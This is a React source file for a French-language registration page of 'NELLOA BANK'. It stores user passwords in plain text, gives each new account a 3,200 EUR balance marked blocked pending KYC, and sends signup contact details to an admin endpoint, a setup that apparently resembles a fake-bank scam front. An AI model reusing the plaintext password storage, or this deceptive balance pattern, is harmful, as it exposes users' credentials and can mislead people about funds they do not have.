import { useState, useEffect } from "react";
import { Link, useLocation } from "wouter";
import { z } from "zod";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { v4 as uuidv4 } from "uuid";
import { CreditCard, Building, Star, CheckCircle2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { saveUsers, getUsers, setSession, getUserByEmail } from "@/lib/storage";

const infoSchema = z.object({
  firstName: z.string().min(2, "Prénom requis"),
  lastName: z.string().min(2, "Nom requis"),
  phone: z.string().min(10, "Téléphone invalide"),
  email: z.string().email("Email invalide"),
  password: z.string().min(6, "6 caractères minimum"),
  confirmPassword: z.string()
}).refine((data) => data.password === data.confirmPassword, {
  message: "Les mots de passe ne correspondent pas",
  path: ["confirmPassword"],
});

type InfoFormValues = z.infer<typeof infoSchema>;

type AccountType = 'personnel' | 'courant' | 'premium';

export function RegisterPage() {
  const [location, setLocation] = useLocation();
  const [step, setStep] = useState(1);
  const [accountType, setAccountType] = useState<AccountType>('courant');
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  // Extract ?type= parameter from URL on mount
  useEffect(() => {
    const searchParams = new URLSearchParams(window.location.search);
    const type = searchParams.get('type');
    if (type === 'personnel' || type === 'courant' || type === 'premium') {
      setAccountType(type);
    }
  }, []);

  const form = useForm<InfoFormValues>({
    resolver: zodResolver(infoSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      phone: "",
      email: "",
      password: "",
      confirmPassword: "",
    },
  });

  const onInfoSubmit = (data: InfoFormValues) => {
    // Check if email already exists
    if (getUserByEmail(data.email)) {
      form.setError("email", { message: "Cet email est déjà utilisé" });
      return;
    }
    setStep(2);
  };

  const handleFinalSubmit = () => {
    setIsSubmitting(true);
    
    // Simulate network delay
    setTimeout(() => {
      const data = form.getValues();
      const id = uuidv4();
      
      const newUser = {
        id,
        firstName: data.firstName,
        lastName: data.lastName,
        phone: data.phone,
        email: data.email,
        password: data.password,
        accountType,
        balance: 3200,
        currency: 'EUR',
        status: 'blocked' as const,
        kycStatus: 'pending' as const,
        createdAt: new Date().toISOString()
      };

      const users = getUsers();
      users.push(newUser);
      saveUsers(users);

      // Fire and forget webhook
      fetch('/api/notify-admin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          firstName: data.firstName, 
          lastName: data.lastName, 
          email: data.email, 
          phone: data.phone, 
          accountType, 
          createdAt: newUser.createdAt 
        })
      }).catch(() => {});

      setSession(id);
      setLocation('/dashboard');
    }, 1500);
  };

  return (
    <div className="min-h-[100dvh] bg-slate-50 flex flex-col">
      <header className="bg-white shadow-sm h-16 flex items-center px-4 md:px-8 shrink-0">
        <Link href="/" className="font-bold text-xl text-primary">NELLOA BANK</Link>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center p-4 md:p-8">
        <div className="w-full max-w-3xl">
          {/* STEPPER */}
          <div className="flex items-center justify-between mb-8 relative">
            <div className="absolute left-0 top-1/2 w-full h-0.5 bg-slate-200 -z-10 -translate-y-1/2"></div>
            <div className="absolute left-0 top-1/2 h-0.5 bg-primary -z-10 -translate-y-1/2 transition-all duration-300" style={{ width: `${(step - 1) * 50}%` }}></div>
            
            {[1, 2, 3].map((num) => (
              <div key={num} className="flex flex-col items-center gap-2 bg-slate-50 px-2">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm transition-colors duration-300 ${step >= num ? 'bg-primary text-white' : 'bg-slate-200 text-slate-500'}`}>
                  {step > num ? <CheckCircle2 className="h-5 w-5" /> : num}
                </div>
                <span className={`text-xs md:text-sm font-medium ${step >= num ? 'text-foreground' : 'text-muted-foreground'}`}>
                  {num === 1 ? "Informations" : num === 2 ? "Compte" : "Récapitulatif"}
                </span>
              </div>
            ))}
          </div>

          <div className="bg-white rounded-2xl shadow-sm border border-border p-6 md:p-10">
            {step === 1 && (
              <div className="animate-in fade-in slide-in-from-bottom-4 duration-500">
                <h2 className="text-2xl font-bold mb-6">Vos informations personnelles</h2>
                <Form {...form}>
                  <form onSubmit={form.handleSubmit(onInfoSubmit)} className="space-y-6">
                    <div className="grid md:grid-cols-2 gap-6">
                      <FormField control={form.control} name="firstName" render={({ field }) => (
                        <FormItem><FormLabel>Prénom</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>
                      )} />
                      <FormField control={form.control} name="lastName" render={({ field }) => (
                        <FormItem><FormLabel>Nom</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem>
                      )} />
                    </div>
                    <div className="grid md:grid-cols-2 gap-6">
                      <FormField control={form.control} name="email" render={({ field }) => (
                        <FormItem><FormLabel>Email</FormLabel><FormControl><Input type="email" {...field} /></FormControl><FormMessage /></FormItem>
                      )} />
                      <FormField control={form.control} name="phone" render={({ field }) => (
                        <FormItem><FormLabel>Téléphone</FormLabel><FormControl><Input type="tel" {...field} /></FormControl><FormMessage /></FormItem>
                      )} />
                    </div>
                    <div className="grid md:grid-cols-2 gap-6">
                      <FormField control={form.control} name="password" render={({ field }) => (
                        <FormItem><FormLabel>Mot de passe</FormLabel><FormControl><Input type="password" {...field} /></FormControl><FormMessage /></FormItem>
                      )} />
                      <FormField control={form.control} name="confirmPassword" render={({ field }) => (
                        <FormItem><FormLabel>Confirmer le mot de passe</FormLabel><FormControl><Input type="password" {...field} /></FormControl><FormMessage /></FormItem>
                      )} />
                    </div>
                    <div className="flex justify-end pt-4">
                      <Button type="submit" size="lg">Suivant</Button>
                    </div>
                  </form>
                </Form>
              </div>
            )}

            {step === 2 && (
              <div className="animate-in fade-in slide-in-from-right-8 duration-500">
                <h2 className="text-2xl font-bold mb-6">Choisissez votre compte</h2>
                <div className="grid md:grid-cols-3 gap-4 mb-8">
                  <div 
                    className={`cursor-pointer rounded-xl border-2 p-6 transition-all duration-200 ${accountType === 'personnel' ? 'border-primary bg-primary/5 shadow-md' : 'border-border hover:border-primary/50'}`}
                    onClick={() => setAccountType('personnel')}
                  >
                    <CreditCard className={`h-8 w-8 mb-4 ${accountType === 'personnel' ? 'text-primary' : 'text-muted-foreground'}`} />
                    <h3 className="font-bold text-lg mb-2">Personnel</h3>
                    <ul className="text-sm text-muted-foreground space-y-2">
                      <li>• IBAN personnel</li>
                      <li>• Carte virtuelle</li>
                    </ul>
                  </div>

                  <div 
                    className={`cursor-pointer rounded-xl border-2 p-6 transition-all duration-200 ${accountType === 'courant' ? 'border-primary bg-primary/5 shadow-md' : 'border-border hover:border-primary/50'}`}
                    onClick={() => setAccountType('courant')}
                  >
                    <Building className={`h-8 w-8 mb-4 ${accountType === 'courant' ? 'text-primary' : 'text-muted-foreground'}`} />
                    <h3 className="font-bold text-lg mb-2">Courant</h3>
                    <ul className="text-sm text-muted-foreground space-y-2">
                      <li>• Virements illimités</li>
                      <li>• Chéquier disponible</li>
                    </ul>
                  </div>

                  <div 
                    className={`cursor-pointer rounded-xl border-2 p-6 transition-all duration-200 ${accountType === 'premium' ? 'border-primary bg-primary/5 shadow-md' : 'border-border hover:border-primary/50'}`}
                    onClick={() => setAccountType('premium')}
                  >
                    <Star className={`h-8 w-8 mb-4 ${accountType === 'premium' ? 'text-primary' : 'text-muted-foreground'}`} />
                    <h3 className="font-bold text-lg mb-2">Premium</h3>
                    <ul className="text-sm text-muted-foreground space-y-2">
                      <li>• Conseiller dédié</li>
                      <li>• Cashback 2%</li>
                    </ul>
                  </div>
                </div>
                <div className="flex justify-between">
                  <Button variant="outline" onClick={() => setStep(1)} size="lg">Précédent</Button>
                  <Button onClick={() => setStep(3)} size="lg">Suivant</Button>
                </div>
              </div>
            )}

            {step === 3 && (
              <div className="animate-in fade-in slide-in-from-right-8 duration-500">
                <h2 className="text-2xl font-bold mb-6">Récapitulatif</h2>
                
                <div className="bg-slate-50 rounded-xl p-6 mb-8 border border-slate-200 space-y-6">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p className="text-sm text-muted-foreground mb-1">Titulaire</p>
                      <p className="font-medium text-foreground">{form.getValues().firstName} {form.getValues().lastName}</p>
                    </div>
                    <div>
                      <p className="text-sm text-muted-foreground mb-1">Email</p>
                      <p className="font-medium text-foreground">{form.getValues().email}</p>
                    </div>
                  </div>
                  
                  <div className="h-px bg-slate-200 w-full"></div>
                  
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <p className="text-sm text-muted-foreground mb-1">Type de compte</p>
                      <p className="font-medium text-foreground capitalize">Compte {accountType}</p>
                    </div>
                    <div>
                      <p className="text-sm text-muted-foreground mb-1">Solde initial</p>
                      <p className="font-bold text-green-600 text-lg">3 200,00 €</p>
                    </div>
                  </div>
                </div>

                <div className="flex justify-between">
                  <Button variant="outline" onClick={() => setStep(2)} size="lg" disabled={isSubmitting}>Précédent</Button>
                  <Button onClick={handleFinalSubmit} size="lg" disabled={isSubmitting} className="min-w-[180px]">
                    {isSubmitting ? "Création en cours..." : "Créer mon compte"}
                  </Button>
                </div>
              </div>
            )}
          </div>
        </div>
      </main>
    </div>
  );
}
